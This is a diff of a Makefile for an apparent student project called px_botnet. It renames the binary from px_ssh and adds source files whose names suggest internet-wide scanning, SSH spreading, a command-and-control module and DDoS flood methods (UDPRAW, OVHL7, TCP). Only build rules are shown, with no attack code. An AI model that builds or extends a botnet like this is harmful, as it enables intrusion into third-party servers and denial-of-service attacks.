@@ -6,7 +6,7 @@
 #    By: tnard <tnard@student.42lyon.fr>            +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2022/03/24 12:35:04 by tnard             #+#    #+#              #
-#    Updated: 2022/03/26 23:43:25 by tnard            ###   ########lyon.fr    #
+#    Updated: 2022/03/27 15:26:29 by tnard            ###   ########lyon.fr    #
 #                                                                              #
 # **************************************************************************** #
 
@@ -17,19 +17,22 @@ RST			= \033[0m
 END			= \e[0m
 
 SRCS		= px_botnet.c src/ft_strnjoin.c src/ft_free_split.c src/ft_generate_ip.c src/ft_intlen.c src/ft_scan_world.c \
-			  src/ft_get_id.c src/http/ft_request.c src/http/http.c
-NAME		= px_ssh
+			  src/ft_get_id.c src/request/ft_request.c src/request/http.c src/protocol/global.c src/protocol/OVHL7.c \
+			  src/protocol/CNC.c src/protocol/HOLD.c src/protocol/HTTP.c src/protocol/JUNK.c src/protocol/RANDHEX.c \
+			  src/protocol/STD.c src/protocol/TCP.c src/protocol/UDPRAW.c src/protocol/UNKNOWN.c src/protocol/XTDCUSTOM.c
+NAME		= px_botnet
 OBJS_DIR	= objs/
 PROJECT_H	= includes/px_botnet.h
 OBJS		= $(SRCS:.c=.o)
 OBJECTS_PREFIXED = $(addprefix $(OBJS_DIR), $(OBJS))
 CC			= gcc
-CC_FLAGS	= -lssh -O2 -lcurl -lpthread#-Wall -Werror -Wextra
+CC_FLAGS	= -Wno-format-extra-args -Wno-unused-result -Wno-format-contains-nul -lssh -O2 -lpthread#-Wall -Werror -Wextra
 
 $(OBJS_DIR)%.o : %.c $(PROJECT_H)
 	@mkdir -p $(OBJS_DIR)
 	@mkdir -p $(OBJS_DIR)src
-	@mkdir -p $(OBJS_DIR)src/http
+	@mkdir -p $(OBJS_DIR)src/request
+	@mkdir -p $(OBJS_DIR)src/protocol
 	@$(CC) $(CC_FLAGS) -c $< -o $@
 	@printf	"\033[2K\r${BLU}[BUILD]${RST} '$<' $(END)"
 
